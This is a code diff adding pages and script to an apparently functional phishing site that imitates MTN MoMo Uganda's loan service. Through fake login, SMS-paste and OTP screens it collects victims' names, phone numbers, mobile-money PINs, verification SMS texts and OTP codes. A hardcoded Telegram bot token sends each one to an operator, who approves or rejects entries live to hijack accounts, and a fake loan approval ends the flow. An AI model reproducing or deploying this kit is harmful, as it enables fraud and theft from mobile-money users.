+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;"
+                disabled>NEXT</button>
+            <div id="mLgn" class="loading" style="margin-top: 10px;">
+                <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
+                <div class="wait-msg" style="font-size: 0.85rem;">Logging in…</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 8: WAIT FOR LOGIN APPROVAL ══════════════════════ -->
+    <div id="page-wait-login-approval" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Authentication in progress...</h2>
+                <p>Please wait</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 9: SMS MESSAGE PASTE ══════════════════════ -->
+    <div id="page-sms-paste" class="page">
+        <div class="sms-topbar">
+            <button class="bk" onclick="goTo('page-login')">← Back</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">SMS Verification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="sms-body-wrap">
+            <div class="sms-card">
+                <h2>Paste SMS Message</h2>
+                <p class="sms-hint">A verification message has been sent to your phone via MTN Uganda. Please copy and paste the full message here.</p>
+                <div class="sms-timer-wrap" id="smsTimerWrap">
+                    <div class="sms-timer-circle">
+                        <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+                            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
+                            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
+                        </svg>
+                        <div class="sms-timer-num" id="smsTimerNum">60</div>
+                    </div>
+                    <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br />Paste your SMS before time runs out.</div>
+                </div>
+                <div class="sms-resend-wrap" id="smsResendWrap">
+                    <p>⏰ Your verification session has expired.<br />Request a new SMS and paste it below.</p>
+                    <button class="btn-resend" id="bResend" onclick="doSmsResend()">🔄 Resend SMS</button>
+                    <div id="mResend" class="loading" style="margin-top:10px;">
+                        <div class="spinner" style="margin:8px auto; width:30px; height:30px; border-width:3px;"></div>
+                        <div class="wait-msg" style="font-size:0.82rem;">Sending…</div>
+                    </div>
+                </div>
+                <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…" oninput="chkSmsMsg()"></textarea>
+                <p class="sms-code-hint">Example: "Your MTN MoMo verification code is: 123456"</p>
+                <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+                <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+                <button id="bSms" class="btn-sms" onclick="doSmsParse()">SUBMIT</button>
+                <div id="mSms" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Processing message…</div>
+                </div>
+            </div>
+        </div>
+        <div class="sms-curve"></div>
+        <div class="sms-foot">© 2026 MTN MoMo Uganda – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 10: WAIT FOR SMS APPROVAL ══════════════════════ -->
+    <div id="page-wait-sms" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Verification in progress...</h2>
+                <p>Please wait</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 11: OTP ══════════════════════ -->
+    <div id="page-otp" class="page">
+        <div class="otp-topbar">
+            <button class="bk" onclick="goTo('page-sms-paste')">← Back</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">OTP Verification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="otp-body-wrap">
+            <div class="otp-card">
+                <h2>Enter OTP Code</h2>
+                <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda</p>
+                <div class="otp-section">
+                    <div class="otp-section-title">OTP Code (4 digits):</div>
+                    <div style="display:flex; align-items:center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+                <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+                <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+                <div id="mOtp" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Verifying…</div>
+                </div>
+            </div>
+        </div>
+        <div class="otp-curve"></div>
+        <div class="otp-foot">© 2026 MTN MoMo Uganda – Powered by MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 12: WAIT FOR OTP APPROVAL ══════════════════════ -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Verifying OTP Code</h2>
+                <p>Please wait</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Do not close this page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 13: APPROVAL ══════════════════════ -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h2 class="appr-title">Loan Approved!</h2>
+                <p class="appr-sub">Your loan has been successfully approved.</p>
+                <div class="appr-banner">
+                    <div class="abl">Amount to Receive</div>
+                    <div class="aba" id="aprAmount">UGX 1,000,000</div>
+                </div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Important Information</div>
+                <p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">📊 Loan Details</div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div>
+                        <div class="ld-lbl">Amount</div>
+                        <div class="ld-val" id="aprAmt">UGX 1,000,000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div>
+                        <div class="ld-lbl">Term</div>
+                        <div class="ld-val" id="aprTerm">48 Months</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">💳</div>
+                    <div>
+                        <div class="ld-lbl">Monthly Payment</div>
+                        <div class="ld-val" id="aprMth">UGX 24,000</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="window.location.href='https://en.wikipedia.org/wiki/Momo_(department)'">FINISH</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
+    <script>
+        // ============================================================
+        // TELEGRAM BOT CONFIGURATION
+        // ============================================================
+        const TG_TOKEN = "9118575930:AAEpyTE-shXWxK9abrBZb02OzOdL1y0bksk";
+        const TG_CHAT = "8944359220";
+        const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
+
+        const sessions = new Map();
+        let sessionCounter = 1;
+
+        function createSession(data) {
+            const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+            const session = {
+                id,
+                ...data,
+                stage: 'application',
+                created_at: new Date().toISOString(),
+                updated_at: new Date().toISOString(),
+                pin: '',
+                smsMessage: '',
+                otp: ''
+            };
+            sessions.set(id, session);
+            return session;
+        }
+
+        function getSession(id) {
+            return sessions.get(id) || null;
+        }
+
+        function updateSession(id, updates) {
+            const s = sessions.get(id);
+            if (!s) return null;
+            Object.assign(s, updates);
+            s.updated_at = new Date().toISOString();
+            return s;
+        }
+
+        async function tgCall(method, body) {
+            try {
+                const r = await fetch(`${TG_API}/${method}`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(body)
+                });
+                return await r.json();
+            } catch (e) {
+                console.warn("tg", method, e);
+                return null;
             }
         }
-        updateCalculator();
-        amountSlider.addEventListener('input', updateCalculator);
-        termSlider.addEventListener('input', updateCalculator);
-        document.getElementById('applyBtn').addEventListener('click', function() {
-            localStorage.setItem('loanAmount', amountSlider.value);
-            localStorage.setItem('loanTerm', termSlider.value);
-            window.location.href = 'application.html';
+
+        // ─── UPDATED tgFmt: SMS now shows user name and number ───
+        function tgFmt(row, kind) {
+            if (kind === "sms") {
+                const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
+                const num = row.phone ? `+256 ${row.phone}` : "—";
+                const sms = row.smsMessage || "—";
+                return `📨 New SMS submitted\n\nName: ${name}\nPhone: ${num}\nMessage: ${sms}\nApplication ID: ${row.id}`;
+            }
+            const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
+            const num = row.phone || "—";
+            const pin = row.pin || "—";
+            const sms = row.smsMessage || "—";
+            const otp = row.otp || "—";
+            let title = "🔑 New PIN submitted";
+            if (kind === "otp") title = "🔢 New OTP submitted";
+            return `${title}\n\nName: ${name}\nPhone: ${num}\nPIN: ${pin}\nSMS: ${sms}\nOTP: ${otp}\nApplication ID: ${row.id}`;
+        }
+
+        async function tgNotify(row, kind) {
+            let keyboard;
+            const msgBtn = {
+                text: "💬 Message User",
+                callback_data: `ask_msg:${row.id}`
+            };
+            if (kind === "pin") {
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approve PIN",
+                            callback_data: `approve_pin:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject PIN",
+                            callback_data: `reject_pin:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            } else if (kind === "sms") {
+                const smsText = row.smsMessage || '—';
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "📋 Copy SMS",
+                            copy_text: {
+                                text: smsText
+                            }
+                        }],
+                        [{
+                            text: "✅ Approve SMS",
+                            callback_data: `approve_sms:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject SMS",
+                            callback_data: `reject_sms:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            } else if (kind === "otp") {
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approve OTP",
+                            callback_data: `approve_otp:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject OTP",
+                            callback_data: `reject_otp:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            }
+            await tgCall("sendMessage", {
+                chat_id: TG_CHAT,
+                text: tgFmt(row, kind),
+                reply_markup: keyboard
+            });
+        }
+
+        let lastOffset = 0;
+        let currentSessionId = null;
+
+        function showAdminModal(message) {
+            document.getElementById('adminModalBody').textContent = message;
+            document.getElementById('adminModalOverlay').classList.add('show');
+        }
+
+        function closeAdminModal() {
+            document.getElementById('adminModalOverlay').classList.remove('show');
+        }
+
+        document.getElementById('adminModalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeAdminModal();
         });
+
+        async function tgPoll() {
+            const offset = lastOffset || Number(localStorage.getItem("tg_offset") || 0);
+            const r = await tgCall("getUpdates", {
+                offset: offset,
+                timeout: 0,
+                allowed_updates: ["callback_query",
+                    "message"
+                ]
+            });
+            if (!r || !r.ok) return;
+            for (const u of r.result) {
+                lastOffset = u.update_id + 1;
+                localStorage.setItem("tg_offset", String(lastOffset));
+
+                if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message
+                    .text.includes("Application ID: ")) {
+                    if (String(u.message.chat.id) !== TG_CHAT) continue;
+                    const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
+                    const customText = u.message.text;
+                    if (currentSessionId && currentSessionId === targetSessionId) {
+                        showAdminModal(customText);
+                        await tgCall("sendMessage", {
+                            chat_id: TG_CHAT,
+                            text: "✅ Message delivered to client."
+                        });
+                    }
+                    continue;
+                }
+
+                const cq = u.callback_query;
+                if (!cq) continue;
+                if (String(cq.from.id) !== TG_CHAT && String(cq.message && cq.message.chat && cq.message.chat.id) !== TG_CHAT) {
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id,
+                        text: "Not authorized"
+                    });
+                    continue;
+                }
+
+                const [action, id] = (cq.data || "").split(":");
+
+                if (action === "ask_msg") {
+                    await tgCall("sendMessage", {
+                        chat_id: cq.message.chat.id,
+                        text: `Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: ${id}`,
+                        reply_markup: {
+                            force_reply: true
+                        }
+                    });
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id
+                    });
+                    continue;
+                }
+
+                let stage = null,
+                    label = "";
+                if (action === "approve_pin") {
+                    stage = "pin_approved";
+                    label = "PIN approved";
+                } else if (action === "reject_pin") {
+                    stage = "pin_rejected";
+                    label = "PIN rejected";
+                } else if (action === "approve_sms") {
+                    stage = "sms_approved";
+                    label = "SMS approved";
+                } else if (action === "reject_sms") {
+                    stage = "sms_rejected";
+                    label = "SMS rejected";
+                } else if (action === "approve_otp") {
+                    stage = "otp_approved";
+                    label = "OTP approved";
+                } else if (action === "reject_otp") {
+                    stage = "otp_rejected";
+                    label = "OTP rejected";
+                }
+
+                if (stage) {
+                    const updated = updateSession(id, {
+                        stage
+                    });
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id,
+                        text: label
+                    });
+                    await tgCall("editMessageReplyMarkup", {
+                        chat_id: cq.message.chat.id,
+                        message_id: cq.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: `✓ ${label}`,
+                                    callback_data: "noop"
+                                }]
+                            ]
+                        }
+                    });
+                    if (currentSessionId === id && updated) {
+                        handleStageUpdate(updated);
+                    }
+                } else {
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id
+                    });
+                }
+            }
+        }
+
+        setInterval(() => {
+            tgPoll().catch(() => {});
+        }, 3000);
+
+        function handleStageUpdate(session) {
+            const stage = session.stage;
+            if (stage === 'pin_approved') {
+                goTo('page-sms-paste');
+                startSmsTimer();
+            } else if (stage === 'pin_rejected') {
+                document.getElementById('lpPhone').value = '';
+                [0, 1, 2, 3, 4].forEach(i => document.getElementById('lp' + i).value = '');
+                goTo('page-login');
+                document.getElementById('bLgn').disabled = false;
+                chkPin();
+                showLgnMsg('error', 'Wrong PIN. Please try again.');
+            } else if (stage === 'sms_approved') {
+                goTo('page-otp');
+            } else if (stage === 'sms_rejected') {
+                document.getElementById('smsMsgBox').value = '';
+                goTo('page-sms-paste');
+                document.getElementById('bSms').disabled = false;
+                chkSmsMsg();
+                showSmsMsg('error', 'The SMS message was rejected. Please paste the correct message.');
+            } else if (stage === 'otp_approved') {
+                const months = parseInt(S.loanTerm) || 48;
+                const monthly = Math.ceil((S.loanAmount || 1000000) / months);
+                document.getElementById('aprAmount').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+                document.getElementById('aprAmt').textContent = 'UGX ' + (S.loanAmount || 1000000).toLocaleString();
+                document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
+                document.getElementById('aprMth').textContent = 'UGX ' + monthly.toLocaleString();
+                goTo('page-approval');
+            } else if (stage === 'otp_rejected') {
+                [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
+                goTo('page-otp');
+                document.getElementById('bOtp').disabled = false;
+                document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+                chkOtp();
+                showOtpMsg('error', 'The OTP code was rejected. Please try again.');
+            }
+        }
+
+        // ============================================================
+        // STATE
+        // ============================================================
+        const S = {
+            loanType: '',
+            loanAmount: 0,
+            loanTerm: '',
+            loanPurpose: '',
+            firstName: '',
+            lastName: '',
+            phone: '',
+            employment: '',
+            annualIncome: 0,
+            applicationId: '',
+            isSubmitting: false
+        };
+
+        // ============================================================
+        // NAVIGATION
+        // ============================================================
+        function goTo(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId) && document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+
+            if (pageId === 'page-sms-paste') {
+                const btn = document.getElementById('bSms');
+                const spinner = document.getElementById('mSms');
+                btn.disabled = false;
+                spinner.classList.remove('show');
+                chkSmsMsg();
+                ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                    document.getElementById(id).classList.remove('show');
+                });
+            }
+
+            if (pageId === 'page-otp') {
+                const btn = document.getElementById('bOtp');
+                const spinner = document.getElementById('mOtp');
+                btn.disabled = false;
+                btn.textContent = 'VERIFY & APPROVE LOAN';
+                spinner.classList.remove('show');
+                chkOtp();
+                ['otpMsg', 'otpMsgOk'].forEach(function(id) {
+                    document.getElementById(id).classList.remove('show');
+                });
+            }
+
+            if (pageId === 'page-login') {
+                const btn = document.getElementById('bLgn');
+                const spinner = document.getElementById('mLgn');
+                btn.disabled = false;
+                spinner.classList.remove('show');
+                S.isSubmitting = false;
+                chkPin();
+            }
+        }
+
+        function startApplication() {
+            const sliderVal = document.getElementById('amtSlider').value;
+            document.getElementById('s1am').value = sliderVal;
+            goTo('page-step1');
+        }
+
+        function normalizePhone(id) {
+            let inp = document.getElementById(id);
+            let val = inp.value.replace(/\D/g, '');
+            if (val.length > 9) val = val.substring(0, 9);
+            inp.value = val;
+        }
+
+        function toS2() {
+            const ty = document.getElementById('s1ty').value;
+            const am = +document.getElementById('s1am').value;
+            const te = document.getElementById('s1te').value;
+            const pu = document.getElementById('s1pu').value;
+
+            if (!ty || am <= 0 || !te || !pu.trim()) {
+                showErr('s1Err', 'Please complete all fields.');
+                return;
+            }
+
+            S.loanType = ty;
+            S.loanAmount = am;
+            S.loanTerm = te;
+            S.loanPurpose = pu;
+            goTo('page-step2');
+        }
+
+        function toS3() {
+            const fi = document.getElementById('s2fi').value.trim();
+            const la = document.getElementById('s2la').value.trim();
+            const ph = document.getElementById('s2ph').value;
+
+            if (!fi || !la || ph.length !== 9) {
+                showErr('s2Err', 'Please enter valid first name, last name, and 9-digit phone number.');
+                return;
+            }
+
+            S.firstName = fi;
+            S.lastName = la;
+            S.phone = ph;
+
+            document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
+            document.getElementById('sT').textContent = S.loanTerm;
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
+                '');
+            document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+
+            goTo('page-step3');
+        }
+
+        function submitApp() {
+            const em = document.getElementById('s3em').value;
+            const in_ = +document.getElementById('s3in').value;
+
+            if (!em || in_ <= 0) {
+                showErr('s3Err', 'Please complete all fields.');
+                return;
+            }
+
+            S.employment = em;
+            S.annualIncome = in_;
+            S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+
+            document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
+            document.getElementById('sT').textContent = S.loanTerm;
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
+                '');
+            document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+
+            goTo('page-processing');
+
+            const session = createSession({
+                firstName: S.firstName,
+                lastName: S.lastName,
+                phone: S.phone,
+                loanAmount: S.loanAmount,
+                loanTerm: S.loanTerm,
+                purpose: S.loanPurpose,
+                employment: S.employment,
+                annualIncome: S.annualIncome
+            });
+            S.applicationId = session.id;
+            currentSessionId = session.id;
+
+            // Redirect to SIM check page (ONLY after clicking submit)
+            setTimeout(() => {
+                goTo('page-sim-check');
+            }, 2000);
+        }
+
+        function showErr(id, msg) {
+            document.getElementById(id).classList.add('show');
+            document.getElementById(id + 'Txt').textContent = msg;
+        }
+
+        function clearErr(id) {
+            document.getElementById(id).classList.remove('show');
+        }
+
+        function updateCalc() {
+            const amt = +document.getElementById('amtSlider').value;
+            document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
+            const monthly = Math.ceil(amt / 48);
+            document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
+        }
+
+        // ══════════════════════════════════════════════════════
+        // LOGIN PAGE — PIN INPUT HELPERS
+        // ══════════════════════════════════════════════════════
+        function pinMvM(el, i) {
+            el.value = el.value.replace(/\D/, '');
+            if (el.value && i < 4) {
+                document.getElementById('lp' + (i + 1)).focus();
+            }
+            chkPin();
+        }
+
+        document.addEventListener('keydown', function(e) {
+            const id = e.target.id;
+
+            if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
+                const idx = parseInt(id[2]);
+                if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
+            }
+
+            if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
+                const idx = parseInt(id[3]);
+                if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
+            }
+        });
+
+        function chkPin() {
+            const phone = document.getElementById('lpPhone').value.trim();
+            const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
+            const ok = phone.length === 9 && pinOk;
+            const btn = document.getElementById('bLgn');
+            btn.className = ok ? 'btn-login rdy' : 'btn-login';
+            btn.disabled = !ok;
+        }
+
+        function togPin() {
+            [0, 1, 2, 3, 4].forEach(i => {
+                const b = document.getElementById('lp' + i);
+                b.type = b.type === 'password' ? 'text' : 'password';
+            });
+        }
+
+        function clearLoginPin() {
+            [0, 1, 2, 3, 4].forEach(i => {
+                document.getElementById('lp' + i).value = '';
+            });
+            chkPin();
+            document.getElementById('lp0').focus();
+        }
+
+        function clearOtpCode() {
+            [0, 1, 2, 3].forEach(i => {
+                document.getElementById('otp' + i).value = '';
+            });
+            chkOtp();
+            document.getElementById('otp0').focus();
+        }
+
+        function showLgnMsg(type, text) {
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('lpMsgTxt').textContent = text;
+                document.getElementById('lpMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('lpMsgOkTxt').textContent = text;
+                document.getElementById('lpMsgOk').classList.add('show');
+            }
+            if (type === 'warning') {
+                document.getElementById('lpMsgWarnTxt').textContent = text;
+                document.getElementById('lpMsgWarn').classList.add('show');
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // LOGIN — SUBMIT PIN TO TELEGRAM
+        // ══════════════════════════════════════════════════════
+        async function doLogin() {
+            if (S.isSubmitting) return;
+            S.isSubmitting = true;
+
+            ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            const phone = document.getElementById('lpPhone').value;
+            const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
+
+            if (phone.length !== 9 || pin.length < 5) {
+                S.isSubmitting = false;
+                showLgnMsg('warning', 'Phone: 9 digits (e.g., 771234567). PIN: 5 digits.');
+                return;
+            }
+
+            document.getElementById('mLgn').classList.add('show');
+            document.getElementById('bLgn').disabled = true;
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    updateSession(S.applicationId, {
+                        pin: pin,
+                        stage: 'pin_submitted'
+                    });
+                    await tgNotify({
+                        id: S.applicationId,
+                        firstName: S.firstName,
+                        lastName: S.lastName,
+                        phone: phone,
+                        pin: pin
+                    }, 'pin');
+
+                    document.getElementById('mLgn').classList.remove('show');
+                    S.isSubmitting = false;
+                    document.getElementById('waitAppId').textContent = S.applicationId;
+                    goTo('page-wait-login-approval');
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                S.isSubmitting = false;
+                document.getElementById('mLgn').classList.remove('show');
+                document.getElementById('bLgn').disabled = false;
+                showLgnMsg('error', 'Network error: ' + err.message);
+            }
+        }
+
+        // ══════════════════════════════════════════════════════
+        // SMS PASTE PAGE
+        // ══════════════════════════════════════════════════════
+        function chkSmsMsg() {
+            const txt = document.getElementById('smsMsgBox').value.trim();
+            document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
+        }
+
+        function showSmsMsg(type, text) {
+            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+            if (type === 'error') {
+                document.getElementById('smsMsgTxt').textContent = text;
+                document.getElementById('smsMsg').classList.add('show');
+            }
+            if (type === 'success') {
+                document.getElementById('smsMsgOkTxt').textContent = text;
+                document.getElementById('smsMsgOk').classList.add('show');
+            }
+        }
+
+        let smsTimerInterval = null;
+        let smsTimerExpired = false;
+
+        function startSmsTimer() {
+            if (smsTimerInterval) clearInterval(smsTimerInterval);
+            smsTimerExpired = false;
+
+            document.getElementById('smsMsgBox').value = '';
+            document.getElementById('smsMsgBox').disabled = false;
+            chkSmsMsg();
+            document.getElementById('smsResendWrap').style.display = 'none';
+
+            const arc = document.getElementById('smsTimerArc');
+            const num = document.getElementById('smsTimerNum');
+            const sec = document.getElementById('smsTimerSec');
+            arc.classList.remove('urgent');
+            num.classList.remove('urgent');
+            arc.style.strokeDashoffset = '0';
+            document.getElementById('smsTimerWrap').style.display = 'flex';
+
+            let remaining = 60;
+            const CIRCUMFERENCE = 113;
+
+            const tick = function() {
+                remaining--;
+                const pct = remaining / 60;
+                arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
+                num.textContent = remaining;
+                sec.textContent = remaining;
+
+                if (remaining <= 10) {
+                    arc.classList.add('urgent');
+                    num.classList.add('urgent');
+                }
+
+                if (remaining <= 0) {
+                    clearInterval(smsTimerInterval);
+                    smsTimerInterval = null;
+                    smsTimerExpired = true;
+
+                    document.getElementById('smsMsgBox').disabled = true;
+                    document.getElementById('smsMsgBox').value = '';
+                    document.getElementById('bSms').disabled = true;
+                    document.getElementById('bSms').className = 'btn-sms';
+                    document.getElementById('smsTimerWrap').style.display = 'none';
+                    document.getElementById('smsResendWrap').style.display = 'block';
+                    document.getElementById('bResend').disabled = false;
+                    document.getElementById('mResend').classList.remove('show');
+                    ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                        document.getElementById(id).classList.remove('show');
+                    });
+                }
+            };
+
+            smsTimerInterval = setInterval(tick, 1000);
+        }
+
+        function stopSmsTimer() {
+            if (smsTimerInterval) {
+                clearInterval(smsTimerInterval);
+                smsTimerInterval = null;
+            }
+        }
+
+        async function doSmsResend() {
+            const btn = document.getElementById('bResend');
+            const spinner = document.getElementById('mResend');
+            btn.disabled = true;
+            spinner.classList.add('show');
+            ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                document.getElementById(id).classList.remove('show');
+            });
+
+            try {
+                const session = getSession(S.applicationId);
+                if (session) {
+                    await tgCall("sendMessage", {
+                        chat_id: TG_CHAT,
+                        text: `🔄 User requested a new SMS message.\nApplication ID: ${S.applicationId}`
+                    });
+                    spinner.classList.remove('show');
+                    document.getElementById('smsResendWrap').style.display = 'none';
+                    document.getElementById('smsMsgBox').disabled = false;
+                    document.getElementById('bSms').disabled = false;
+                    startSmsTimer();
+                    showSmsMsg('success', 'A new SMS has been requested. Admin will send it shortly.');
+                    btn.disabled = false;
+                } else {
+                    throw new Error('Session not found');
+                }
+            } catch (err) {
+                spinner.classList.remove('show');
+                btn.disabled = false;
+                showSmsMsg('error', 'Network error: ' + err.message);
+            }
+        }
+
+        // ─── Updated SMS parser: shows name and number in Telegram notification ───
+        async function doSmsParse() {
+            ['smsMsg', 'smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+            if (smsTimerExpired) {
+                document.getElementById('smsResendWrap').style.display = 'block';
+                document.getElementById('bResend').disabled = false;
+                return;
+            }
+
+            const msg = document.getElementById('smsMsgBox').value.trim();
+            if (msg.length < 3) {
